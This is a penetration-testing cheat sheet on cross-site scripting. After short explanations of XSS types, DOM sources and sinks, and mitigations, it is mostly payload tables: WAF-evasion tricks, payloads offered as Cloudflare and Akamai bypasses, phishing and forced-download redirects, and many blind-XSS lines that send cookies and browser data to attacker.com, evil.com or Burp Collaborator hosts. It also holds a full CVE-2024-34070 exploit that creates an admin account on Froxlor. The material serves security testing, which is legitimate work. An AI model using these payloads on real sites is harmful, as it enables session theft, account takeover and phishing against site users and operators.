

### **Cross-Site Scripting (XSS)**

| **Aspect**                   | **Details**                                                                                                                                           |
|------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Description**              | Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. These scripts can be executed in the context of the victim’s browser, leading to unauthorized actions, data theft, or redirection to malicious sites. |
| **Conditions to be Vulnerable** | - Application does not properly sanitize or encode user input. <br> - User input is reflected or stored and then displayed in the web page without proper validation. |
| **Where to Find**            | - Input fields like comment sections, search boxes, or URL parameters. <br> - Applications that reflect user input in HTML responses or store it in databases. <br> - Dynamic content that renders user input directly in web pages. |
| **Common Exploits**          | - **Stored XSS**: Attacker submits a malicious script that is stored on the server and displayed to users later. <br> - **Reflected XSS**: Malicious script is reflected back to the user directly in the HTTP response (e.g., in search results). <br> - **DOM-based XSS**: JavaScript on the page manipulates the DOM directly based on user input, allowing script injection. |
| **Example**                  | An attacker injects the payload `<script>alert('XSS')</script>` into a comment field on a blog. If the application does not sanitize the input, this script will execute in the browsers of other users who view the blog post, triggering the `alert()` function. |
| **Mitigation**               | - **Input Validation**: Validate and sanitize all user inputs to remove potentially dangerous characters. <br> - **Output Encoding**: Ensure that any user input displayed on a webpage is properly encoded (e.g., HTML encoding). <br> - **Use Content Security Policy (CSP)**: Implement a CSP to limit the sources from which scripts can be loaded. <br> - **Escaping Data in JavaScript and HTML**: Escape any data that is inserted into HTML, JavaScript, or attributes to prevent script injection. |

---

## DOM XSS
> DOM XSS in Details
> 

**vulnerable sources** and **sinks** for **DOM-based XSS (DOM XSS)** attacks.

| **Source** | **Description** | **Sink** | **Description** |
|------------|-----------------|----------|-----------------|
| `document.location` | Represents the full URL of the current page. A common source for DOM XSS where untrusted data can be injected into the URL. | `innerHTML` | Allows injection of HTML content, making it vulnerable to script execution when untrusted data is added. |
| `document.URL` | Represents the URL of the document. Like `document.location`, this can be manipulated to inject untrusted data. | `document.write()` | Writes raw HTML to the document, allowing the execution of JavaScript if unsanitized input is passed. |
| `window.location.hash` | Represents the fragment identifier (hash) of the URL. Used frequently in single-page applications (SPAs) but can be vulnerable if data is inserted directly into the page. | `eval()` | Executes JavaScript code from a string, leading to arbitrary script execution if the input is not properly sanitized. |
| `document.cookie` | Contains the browser's cookie information, which could be manipulated or read if an attacker injects data into the cookie field. | `setAttribute()` | Sets the value of an element's attribute. If untrusted input is used, it can modify the attribute and trigger script execution. |
| `window.name` | Represents the name of the window or tab. It’s often used in web applications and can be manipulated to inject data. | `outerHTML` | Similar to `innerHTML`, this property can allow script injection into elements, exposing the application to XSS. |
| `document.referrer` | Contains the URL of the page that navigated to the current page. If this is used directly, it can lead to vulnerabilities. | `on* event handlers` | Event handlers like `onclick`, `onmouseover`, etc., can be vulnerable if user-controlled data is inserted into them. |
| `window.navigator` | Contains information about the browser, such as user-agent, platform, etc. Sensitive to manipulation. | `createElement()` | Creating an element dynamically based on untrusted data can open the door to DOM-based XSS if the input isn't sanitized. |
| `localStorage` | Web storage that allows data to persist between page reloads. It can be manipulated if an attacker gains access to it. | `insertAdjacentHTML()` | This method inserts raw HTML at a specified position, and if input is not sanitized, it can execute malicious scripts. |
| `sessionStorage` | Similar to `localStorage`, this stores data for the duration of the page session. Malicious data could be injected. | `window.setTimeout()` | If user-controlled data is injected into `setTimeout`, it can be executed as JavaScript after a delay. |
| `document.forms` | Represents the forms on the page. Malicious input in form elements can lead to DOM XSS if reflected directly. | `window.location` | Using data directly in URL redirection or manipulation can expose the application to DOM XSS. |

### Explanation:

- **Sources** are locations where untrusted data originates, such as the URL, cookies, or storage.
- **Sinks** are locations where this data is used, such as `innerHTML`, `eval()`, or event handlers, where malicious scripts can execute.

---


### **DOM-based XSS – Sink Table with Sample Output**

| **Sink Function**  | **What It Does**                                                             | **Vulnerable Code Example**                            | **Sample Input (URL)**                             | **Expected Output**                       |
| ------------------ | ---------------------------------------------------------------------------- | ------------------------------------------------------ | -------------------------------------------------- | ----------------------------------------- |
| `innerHTML`        | Inserts content into the DOM. Executes `<script>` tags.                      | `element.innerHTML = window.location.hash;`            | `http://example.com/#<script>alert(1)</script>`    | JavaScript alert box pops up (`alert(1)`) |
| `outerHTML`        | Replaces the element (including its tags). Executes embedded scripts.        | `element.outerHTML = window.location.hash;`            | `http://example.com/#<img src=x onerror=alert(2)>` | Image error triggers `alert(2)`           |
| `eval()`           | Executes a string as JavaScript code. Dangerous if input is user-controlled. | `eval(window.location.hash);`                          | `http://example.com/#alert(3)`                     | Executes `alert(3)`                       |
| `document.write()` | Writes directly to the document. Executes HTML and script tags.              | `document.write(window.location.hash);`                | `http://example.com/#<script>alert(4)</script>`    | `alert(4)` executes on page load          |
| `setTimeout()`     | Executes a string as code after delay. Same risk as `eval()` when misused.   | `setTimeout(window.location.hash, 1000);`              | `http://example.com/#alert(5)`                     | After 1s, runs `alert(5)`                 |
| `window.location`  | Redirects to URL; dangerous if attacker controls the input.                  | `window.location = window.location.hash.substring(1);` | `http://example.com/#https://evil.com`             | Redirects to `https://evil.com`           |




> https://github.com/m14r41/PentestingEverything/blob/main/Web%20Applications/Vulnerabilities/XSS/DOM-XSS.md

---
## Login fail XSS 

> CVE-2024-34070 : https://github.com/advisories/GHSA-x525-54hf-xr53

```
admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
```

## XSS Payload

```
i2lte%22%3e%3cscript%3ealert(1)%3c%2fscript%3eayawz
```

```
<svg onload​='setTimeout(function() { alert("XSS"); }, 100);'>
```

```
%22%27%3E%3CA%20HREF=%22http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%22%3EXSS%3C/A%3E
```
# Bypassing WAF in XSS Attacks


Bypassing WAF (Web Application Firewall) in XSS (Cross-Site Scripting) attacks relies on exploiting various techniques and methods to bypass the protection put in place by the firewall. Below are some techniques and examples.

## Techniques and Examples

| **Technique**                                 | **Description**                                                                                                           | **Example**                                                                                                           |
|-----------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| **Encoding**                                 | Input encoding can be used to confuse WAF and prevent malicious payload detection.                                         | URL Encoding: `<script>alert('XSS')</script>` encoded as `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`<br>HTML Entity Encoding: `&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;` |
| **Using Comments**                          | Some WAFs may ignore input if the code is split via comments.                                                              | `<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>`                                                             |
| **Case Variation**                          | WAF can be case sensitive. Change the case to make the code undetectable.                                                 | `<ScRipT>alert('XSS')</sCrIpT>`                                                                                         |
| **Alternative Event Handlers**               | Exploit events in HTML that may not be strictly checked by WAF, such as onfocus or onmouseover.                           | `<img src="x" onerror="alert('XSS')">`<br>Replaced by `<input onfocus="alert('XSS')">`                               |
| **Padding Characters**                       | Add spaces or insignificant characters inside the malicious code to make it undetectable.                                  | `<scr ipt>alert('XSS')</scr ipt>`                                                                                       |
| **Use eval(), setTimeout(), or setInterval()** | Some WAFs scan for obvious code like alert() or document.write(). Using functions like eval() or setTimeout() can make code less obvious. | `<script>setTimeout(function(){alert('XSS')}, 100);</script>`                                                           |
| **JavaScript Coding Using String.fromCharCode** | Use String.fromCharCode function to generate JavaScript code dynamically.                                                | `<script>alert(String.fromCharCode(88,83,83));</script>` (prints "XSS")                                                |
| **DOM-based XSS Techniques**                 | Bypass WAF using techniques that rely on XSS in the DOM only.                                                               | ```javascript<br>var input = document.createElement('input');<br>input.setAttribute('onfocus', 'alert("XSS")');<br>document.body.appendChild(input);<br>input.focus();<br>``` |
| **Hiding Code Inside Unexpected Media**      | Embed XSS code inside non-traditional HTML elements, such as SVG files or titles.                                          | `<svg onload="alert('XSS')"></svg>`                                                                                     |
| **Complex Conditional Statements or Mathematical Functions** | Use conditional statements or mathematical operations to make malicious code less obvious.                                | `<script>if(1<2){alert('XSS')}</script>`                                                                                 |
| **JavaScript: In URL**                       | Insert JavaScript code inside a URL using the javascript: protocol.                                                       | `<a href="javascript:alert('XSS')">Click me</a>`                                                                       |
| **Exploit Weak or Non-Comprehensive Filters**| Some WAFs may not scan all input types or fields. Inject code in unexpected places.                                         | `<input type="hidden" value="<script>alert('XSS')</script>">`                                                          |

---

---

| Attack Type                | Payload |
|----------------------------|---------|
| **Phishing Attack** | ```html<br><script>window.location.href = "https://attacker-site.com/fake-login?redirect=" + encodeURIComponent(document.URL);</script><br>``` |
| **Session Hijacking** | ```html<br><script>document.location = "https://attacker-site.com/steal?cookie=" + document.cookie;</script><br>``` |
| **Malware Download (Link)** | ```html<br><a href="https://attacker-site.com/malware.exe" download="Important_Update.exe">Click here to update</a><br>``` |
| **Malware Download (Forced)** | ```html<br><script>window.location.href = "https://attacker-site.com/malware.exe";</script><br>``` |



# Blind XSS Payloads with Burp Collaborator

| Attack Type                             | Description                                                      | Payload                                                                                       |
|-----------------------------------------|------------------------------------------------------------------|-----------------------------------------------------------------------------------------------|
| **Stored XSS (Stealing Cookies)**       | Sends the victim's cookies to the attacker's Burp Collaborator server. | `<img src="https://abc123.burpcollaborator.net/?cookie=" + document.cookie>`                |
| **Blind XSS (Admin Panel Exploitation)**| Captures cookies when an admin unknowingly views the injected data. | `<img src="https://abc123.burpcollaborator.net/admin-viewed?data="+document.cookie>`        |
| **JavaScript-Based Cookie Exfiltration**| Forces the browser to send an image request containing cookies.  | `<script> new Image().src="https://abc123.burpcollaborator.net/?cookie="+document.cookie; </script>` |
| **Alternative JavaScript-Based Cookie Theft** | Another variant using `new Image()` to exfiltrate session cookies. | `<script> new Image().src="https://abc123.burpcollaborator.net/?cookie="+document.cookie; </script>` |
| **Repeated JavaScript Exfiltration**   | Same as above but repeated for redundancy in execution.         | `<script> new Image().src="https://abc123.burpcollaborator.net/?cookie="+document.cookie; </script>` |
| **Blind XSS using JavaScript Execution**| Executes JavaScript when viewed by an admin.                     | `<script>fetch('https://abc123.burpcollaborator.net/log?cookie='+document.cookie)</script>` |
| **Blind XSS in Link Tag**               | Triggers when an admin clicks the link.                          | `<a href="javascript:eval('new Image().src=\'https://abc123.burpcollaborator.net/?cookie=\'+document.cookie')">Click me</a>` |
| **Blind XSS in SVG**                    | Executes JavaScript when an SVG element loads.                   | `<svg onload="fetch('https://abc123.burpcollaborator.net/?cookie='+document.cookie)"></svg>` |



---

**Blind XSS 1**

| **Payload** |
|-------------|
| `<script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/li7uw7cvp0uc5oamkgncal5locu3iv6k.oastify.com/).slice(2), document.documentElement.appendChild(s))//'>` |
| `<iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>` |
| `<img src=x onerror=this.src='ua83og44h9mlxx2vcpfl2uxuglmca5yu.oastify.com/?c='+document.cookie>` |
| `<img src="x" onerror="this.src='http://gvftp2et84dm9snmmvzguebae1kt8jw8.oastify.com/?c=' + encodeURIComponent(document.domain)">` |
| `<img src="x" onerror="this.src='http://gvftp2et84dm9snmmvzguebae1kt8jw8.oastify.com/?c=' + encodeURIComponent(document.cookie)">` |
| `<img src="x" onerror="document.domain='example.com'; this.src='http://hcxqq36rjwo8zk4iech84hzhi8o0cr0g.oastify.com.oastify.com/?c=' + encodeURIComponent(document.domain)">` |



**Explanation:
**> The payloads below don’t immediately show an alert or result in visible execution on the page. Instead, they work by sending data (such as cookies, document location, etc.) to an external server, which is the characteristic of a Blind XSS attack.

> The attacker might not see immediate feedback on their end, but when the attacker checks their server logs, they can see the captured data.

**Actual Blind XSS**

| **Payload** |
|-------------|
| `<script>new Image().src = 'http://attacker.com/log?cookie=' + document.cookie;</script>` |
| `<script>fetch('http://attacker.com/log?data=' + btoa(document.domain))</script>` |
| `<script>fetch('http://attacker.com/log?data=' + document.location)</script>` |
| `<script>window.location='http://attacker.com/log?location=' + document.location;</script>` |
| `<script>fetch('http://attacker.com/log?userAgent=' + navigator.userAgent)</script>` |
| `<script>new Image().src = 'http://attacker.com/log?referrer=' + document.referrer;</script>` |
| `<script>fetch('http://attacker.com/log?screen=' + window.screen.width + 'x' + window.screen.height)</script>` |
| `<script>new Image().src = 'http://attacker.com/log?history=' + btoa(window.history.length)</script>` |
| `<script>new Image().src = 'http://attacker.com/log?hostname=' + document.location.hostname;</script>` |
| `<script>fetch('http://attacker.com/log?title=' + encodeURIComponent(document.title))</script>` |
| `<script>new Image().src = 'http://attacker.com/log?lang=' + navigator.language;</script>` |
| `<script>new Image().src = 'http://attacker.com/log?cookieEnabled=' + navigator.cookieEnabled;</script>` |
| `<script>fetch('http://attacker.com/log?time=' + new Date().getTime())</script>` |
| `<script>fetch('http://attacker.com/log?page=' + encodeURIComponent(document.location.href))</script>` |
| `<script>new Image().src = 'http://attacker.com/log?screenColorDepth=' + window.screen.colorDepth;</script>` |
| `<script>new Image().src = 'http://attacker.com/log?platform=' + navigator.platform;</script>` |
| `<script>new Image().src = 'http://attacker.com/log?timezone=' + Intl.DateTimeFormat().resolvedOptions().timeZone;</script>` |
| `<script>new Image().src = 'http://attacker.com/log?ip=' + btoa(window.location.hostname);</script>` |
| `<script>new Image().src = 'http://attacker.com/log?agent=' + encodeURIComponent(navigator.userAgent);</script>` |


- Cookie Stealing: The first example sends the document cookies to an external server.
- Location and Domain Information: Other payloads retrieve domain, referrer, current URL, and page title and send this data to the attacker's server.
- Device and Browser Info: Payloads also send details like screen size, user agent, cookie settings, timezone, and platform.
- History: Sends information about the browser history (number of visited pages).


## Cloudflare Bypass Payloads

| **Payload**                                                                                 |
|---------------------------------------------------------------------------------------------|
| `<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>`                              |
| `"prompt(document.domain)"`                                                                 |
| `<img/src=x onError="${x};alert(Hello);">`                                                  |
| `<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt\`1\``                           |
| `<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>`                            |
| `%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e`                                                |
| `<select><style></select><svg onload=alert(1)></style>`                                      |
| `"><img src=x onerrora=confirm() onerror=confirm(1)>`                                        |
| `<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>`                             |
| `"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>` |
| `%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E`                                          |
| `<img/src=x onError="${x};alert(Hello);">`                                                  |
| `&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;`                             |
| `"><track/onerror='confirm\`1\`'>`                                                          |
| `<inpuT autofocus oNFocus="setTimeout(function() { /\/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/\/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;` |
| `<inpuT autofocus oNFocus="setTimeout(function() { /*\*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;` |
| `<script>document.write('<img src="http://evil.com?cookie='+document.cookie+'">');</script>` |
| `<img src="https://attacker.com/cookie?value='+document.cookie+'">`                          |
| `<a href="javascript:alert('XSS');">Click me!</a>`                                           |
| `<svg onload="fetch('https://attacker.com/?cookie='+document.cookie)"></svg>`                |
| `<iframe src="https://attacker.com/?cookie='+document.cookie+'"></iframe>`                   |
| `<img src="https://attacker.com/cookie?cookie='+document.cookie+'" onerror="alert('XSS')">`  |
| `<script>eval('alert(1)');</script>`                                                         |
| `<object data="javascript:alert(1);"></object>`                                              |
| `<a href="javascript:eval('alert(1)');">Click here</a>`                                     |
| `<input autofocus onfocus="alert('XSS')">`                                                  |
| `<iframe srcdoc="<script>alert('XSS')</script>"></iframe>`                                    |
| `<style>@import url('javascript:alert(1)');</style>`                                         |
| `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`                            |
| `<link rel="stylesheet" href="javascript:alert(1)">`                                         |

---

## Akamai Technology Bypass Payloads

| **Payload**                                                                                     |
|-------------------------------------------------------------------------------------------------|
| `<script>alert('XSS');</script>`                                                                 |
| `<img src="x" onerror="alert('XSS')">`                                                           |
| `<a href="javascript:alert('XSS');">Click me</a>`                                                 |
| `<svg onload="alert('XSS')"></svg>`                                                              |
| `<iframe src="javascript:alert('XSS')"></iframe>`                                                |
| `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">`                           |
| `<link rel="stylesheet" href="javascript:alert('XSS')">`                                         |
| `<script src="https://evil.com/malicious.js"></script>`                                           |
| `"><img src="x" onerror="alert(1)">`                                                            |
| `<object data="javascript:alert('XSS');"></object>`                                              |
| `<img src="https://attacker.com/cookie?value='+document.cookie+'" onerror="alert('XSS')">`      |
| `<input autofocus onfocus="alert('XSS')">`                                                      |
| `<a href="http://example.com" onmouseover="alert('XSS')">Hover me!</a>`                          |
| `<script>document.write('<img src="http://evil.com?cookie='+document.cookie+'">');</script>`     |
| `<style>@import url('javascript:alert(1)');</style>`                                             |
| `<iframe srcdoc="<script>alert('XSS')</script>"></iframe>`                                        |
| `<form action="javascript:alert('XSS')"></form>`                                                 |
| `<input type="text" value="test" onfocus="alert('XSS')">`                                       |
| `<button onclick="alert('XSS')">Click me</button>`                                               |
| `<div onclick="alert('XSS')">Click here</div>`                                                  |
| `<script>eval('alert(1)');</script>`                                                             |
| `"><iframe src="javascript:alert('XSS')"></iframe>`                                              |
| `<a href="javascript:confirm('XSS')">Click me</a>`                                              |
| `<img src="x" onError="confirm('XSS')">`                                                        |
| `<object data="https://attacker.com/xss?cookie=' + document.cookie">`                           |
| `<select><option value="1" onfocus="alert(1)">Option</option></select>`                         |
| `<script>fetch('https://attacker.com/log?cookie='+document.cookie);</script>`                   |
| `<audio autoplay><source src="javascript:alert('XSS')"></audio>`                                |
